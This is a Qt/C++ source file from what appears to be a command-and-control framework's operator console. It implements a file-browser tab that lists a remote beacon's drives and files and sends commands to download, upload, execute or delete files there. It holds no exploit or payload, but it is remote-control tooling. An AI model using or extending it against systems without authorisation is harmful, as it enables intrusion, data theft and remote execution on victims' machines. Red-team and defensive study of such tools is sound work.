/*
 * Copyright (c) 2021.  https://github.com/geemion
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "filebrowser.h"
#include "../beacon/beacon_req.h"

enum file_tab_menu_index
{
	ICO = 0,
	NAME,
	FILE_SIZE,
	MODIFIED,
	MAX_INDEX
};

const QString filelist_label[MAX_INDEX] = { "D","Name","Size", "Modified" };

bool filelist_sort_filter_proxy_model::lessThan(const QModelIndex &left, const QModelIndex &right) const {
	auto s1 = sourceModel()->data(left); auto s2 = sourceModel()->data(right);
	return QString::compare(s1.toString(), s2.toString(), Qt::CaseInsensitive) < 0;
}

bool filetree_sort_filter_proxy_model::lessThan(const QModelIndex &left, const QModelIndex &right) const {
	auto s1 = sourceModel()->data(left); auto s2 = sourceModel()->data(right);
	return QString::compare(s1.toString(), s2.toString(), Qt::CaseInsensitive) < 0;
}

file_tab::file_tab(QWidget* parent, const QString& beacon_id, beacon_req* cmd) :beacon_id_(beacon_id), cmd_(cmd)
{
	ui_.setupUi(this);

	init_file_view();

	connect(ui_.FileTreeView, SIGNAL(doubleClicked(QModelIndex)), this, SLOT(on_filetree_doubleclicked(QModelIndex)));
	connect(ui_.FileDetailView, SIGNAL(doubleClicked(QModelIndex)), this, SLOT(on_filelist_doubleclicked(QModelIndex)));
	connect(ui_.UpLevelButton, SIGNAL(clicked()), this, SLOT(on_uplevel_dir()));

	cmd_->send_get_disk_list(beacon_id_.toStdString());
}

void file_tab::on_disk_data(const QByteArray& data)
{
	c2::DiskListData disklist;
	if (!disklist.ParseFromArray(data.data(), data.size()))
		return;

	clear_item_model_data(filetree_model_, 0);
	auto size = disklist.drivers_size();
	for (auto i = 0; i < size; i++)
	{
		std::string driver = disklist.drivers(i);
		auto driver_item = new QStandardItem(QIcon(":/ico/ico/disk.png"), QString::fromStdString(driver));

		auto count = filetree_model_->rowCount();
		filetree_model_->setItem(count, 0, driver_item);
	}

}

void file_tab::on_filelist_data(const QByteArray& data)
{
	c2::FileListData filelist;

	if (!filelist.ParseFromArray(data.data(), data.size()))
		return;

	auto dir = QString::fromStdString(filelist.parent_dir());
	set_current_path(dir);

	on_filelist_data(filelist);
	on_filetree_data(filelist);
}

//todo:cache filelist
void file_tab::on_filelist_data(c2::FileListData& data)
{
	clear_item_model_data(filelist_model_, 0);
	auto size = data.files_size();
	for (auto i = 0; i < size; i++)
	{
		auto file = data.files(i);

		auto count = filelist_model_->rowCount();
		auto name_item = new QStandardItem(QString::fromStdString(file.file_name())); //todo:need delete?
		auto size_item = new QStandardItem(QString::number(file.file_size() / 1024) + "kb");
		auto modified_item = new QStandardItem(get_str_tm(file.modify_unix_tm()));
		QStandardItem* dir_item = nullptr;
		if (!file.is_dir()) {
			dir_item = new QStandardItem(QIcon(":/ico/ico/file.png"), "F");
			dir_item->setCheckable(false);
		}
		else
			dir_item = new QStandardItem(QIcon(":/ico/ico/dir.png"), "D");

		filelist_model_->setItem(count, ICO, dir_item);
		filelist_model_->setItem(count, NAME, name_item);
		filelist_model_->setItem(count, FILE_SIZE, size_item);
		filelist_model_->setItem(count, MODIFIED, modified_item);
	}

}

void file_tab::on_filetree_data(c2::FileListData& data)
{
	auto parent_dir = QString::fromStdString(data.parent_dir());
	auto parent_item = get_parent_item(parent_dir);
	if (!parent_item)
		return;

	int row_count = parent_item->rowCount();
	if (row_count > 0)
		parent_item->removeRows(0, row_count);

	auto size = data.files_size();
	for (auto i = 0; i < size; i++)
	{
		auto file = data.files(i);

		auto count = filelist_model_->rowCount();
		QStandardItem* name_item = nullptr;
		if (file.is_dir())
			name_item = new QStandardItem(QIcon(":/ico/ico/dir.png"), QString::fromStdString(file.file_name()));
		else
			name_item = new QStandardItem(QIcon(":/ico/ico/file.png"), QString::fromStdString(file.file_name()));

		parent_item->appendRow(name_item);
	}
}

void file_tab::set_current_path(const QString& path)
{
	ui_.CurrentPathEdit->clear();
	ui_.CurrentPathEdit->setText(path);
}

void file_tab::on_upload_file(const QString& upload_dir)
{
	QString file = QFileDialog::getOpenFileName(this, tr("Select File"), "", tr("All files(*.*)"));
	if (file.isEmpty())
		return;

	//todo: create a thread to do 
	QByteArray file_data;
	QFile qfile(file);
	if (qfile.open(QIODevice::ReadOnly))
	{
		file_data = qfile.readAll();
		qfile.close();

		auto fileinfo = QFileInfo(file);
		cmd_->send_upload_file(beacon_id_.toStdString(), upload_dir.toStdString(), fileinfo.fileName().toStdString(), file_data);
	}
}

void file_tab::on_delete_file(const QString& path)
{
	cmd_->send_delete_file(beacon_id_.toStdString(), path.toStdString());
}

void file_tab::on_exec_file(const QString& path)
{
	cmd_->send_exec_file(beacon_id_.toStdString(), path.toStdString());
}

void file_tab::on_download_file(const QString& path)
{
	cmd_->send_download_file(beacon_id_.toStdString(), path.toStdString());
}

QStringList file_tab::get_path_ino_name(const QString& dir_path)
{
	QStringList ino_name;
	if (dir_path.size() == 0)
		return ino_name;

	if (dir_path.size() == 1 && dir_path[0] == "/")
	{
		ino_name.append("/");
		return ino_name;
	}

	if (dir_path[0] == "/")
	{
		ino_name.append("/");
		ino_name = ino_name + dir_path.mid(2).split("/");
		return ino_name;
	}

	return dir_path.split("/");
}

QStandardItem* file_tab::get_parent_item(const QString& parent_dir)
{
	QStandardItem* parent_item = nullptr;
	QStringList dirs = get_path_ino_name(parent_dir);

	auto view = ui_.FileTreeView;
	QModelIndex index = view->rootIndex();

	std::function<QModelIndex(QModelIndex idx, const QString& dir)> get_dir = [&](QModelIndex idx, const QString& dir)->QModelIndex {
		int rows = filetree_model_->rowCount(idx);
		for (int i = 0; i < rows; i++)
		{
			QString name;
			QStandardItem* item;
			QModelIndex dir_index;
			if (idx == view->rootIndex())
			{
				dir_index = filetree_model_->index(i, 0);
				name = filetree_model_->index(i, 0).data().toString();
			}
			else
			{
				item = filetree_model_->itemFromIndex(idx);
				name = item->child(i, 0)->data(Qt::DisplayRole).toString();
				dir_index = item->child(i, 0)->index();
			}
			if (!name.compare(dir, Qt::CaseInsensitive))
				return dir_index;
		}
		return QModelIndex();
	};

	for (int i = 0; i < dirs.size(); i++)
	{
		index = get_dir(index, dirs[i]);
		if (!index.isValid())
			break;
	}

	if (index.isValid())
		parent_item = filetree_model_->itemFromIndex(index);

	return parent_item;
}

bool file_tab::eventFilter(QObject *obj, QEvent *e)
{
	if (e->type() == QEvent::ContextMenu) {
		QMenu *menu = nullptr;
		if (obj == ui_.FileDetailView) menu = &file_menu_;
		QContextMenuEvent *ctxevt = dynamic_cast<QContextMenuEvent*>(e);
		if (ctxevt && menu) {
			menu->move(ctxevt->globalPos());
			menu->show();
		}
	}

	if (e->type() == QEvent::KeyPress) {
		QKeyEvent *keyevt = dynamic_cast<QKeyEvent*>(e);
		if (keyevt->matches(QKeySequence::Refresh)) {
			cmd_->send_get_disk_list(beacon_id_.toStdString());
		}
	}

	return QWidget::eventFilter(obj, e);
}

void file_tab::init_file_view()
{
	QTreeView *list_view = ui_.FileDetailView;
	filelist_model_ = new QStandardItemModel;
	proxy_filelist_ = new filelist_sort_filter_proxy_model(list_view);

	std::vector<std::pair<int, QString>> list_layout = {
		{ 40, filelist_label[ICO] },
		{ 400, filelist_label[NAME] },
		{ 120, filelist_label[FILE_SIZE] },
		{ 200, filelist_label[MODIFIED] }
	};

	set_default_tree_view_style(list_view, filelist_model_, proxy_filelist_, list_layout);
	list_view->viewport()->installEventFilter(this);
	list_view->installEventFilter(this);

	file_menu_.addAction(tr("Download"), this, [&] {
		auto dir = ui_.CurrentPathEdit->text();
		auto file_path = dir + "/" + get_current_item_view_data(ui_.FileDetailView, NAME);
		on_download_file(file_path);
	});

	file_menu_.addAction(tr("Upload"), this, [&] {
		auto dir = ui_.CurrentPathEdit->text();
		on_upload_file(dir);
	});

	file_menu_.addAction(tr("Execute"), this, [&] {
		auto dir = ui_.CurrentPathEdit->text();
		auto file_path = dir + "/" + get_current_item_view_data(ui_.FileDetailView, NAME);
		on_exec_file(file_path);
	});

	file_menu_.addAction(tr("Delete"), this, [&] {
		auto dir = ui_.CurrentPathEdit->text();
		auto file_path = dir + "/" + get_current_item_view_data(ui_.FileDetailView, NAME);
		on_delete_file(file_path);
	});

	QTreeView *tree_view = ui_.FileTreeView;
	filetree_model_ = new QStandardItemModel;
	proxy_filetree_ = new filetree_sort_filter_proxy_model(tree_view);

	std::vector<std::pair<int, QString>> tree_layout = {
		{ 500, filelist_label[NAME] }
	};

	set_default_tree_view_style(tree_view, filetree_model_, proxy_filetree_, tree_layout);
	tree_view->viewport()->installEventFilter(this);
	tree_view->installEventFilter(this);
}

void file_tab::on_filetree_doubleclicked(QModelIndex index)
{

	QModelIndex parent = index;
	QStringList item_list;
	while (parent.isValid())
	{
		item_list << parent.data().toString();
		parent = parent.parent();
	}
	QString path;
	for (int i = (item_list.size() - 1); i >= 0; i--)
	{
		path += item_list.at(i);
		if (i != 0)
			path += "/";
	}

	set_current_path(path);
	cmd_->send_get_file_list(beacon_id_.toStdString(), path.toStdString());
}

void file_tab::on_filelist_doubleclicked(QModelIndex index)
{
	auto dir = index.sibling(index.row(), ICO).data().toString();
	if (dir != "D")
		return;

	auto filename = index.sibling(index.row(), NAME).data().toString();
	QDir qdir(ui_.CurrentPathEdit->text());
	QString full_path = qdir.absoluteFilePath(filename);
	cmd_->send_get_file_list(beacon_id_.toStdString(), full_path.toStdString());
}

void file_tab::on_uplevel_dir()
{
	QString current_path = ui_.CurrentPathEdit->text();
	QFileInfo qfile(current_path);
	set_current_path(qfile.absolutePath());
	cmd_->send_get_file_list(beacon_id_.toStdString(), qfile.absolutePath().toStdString());
}

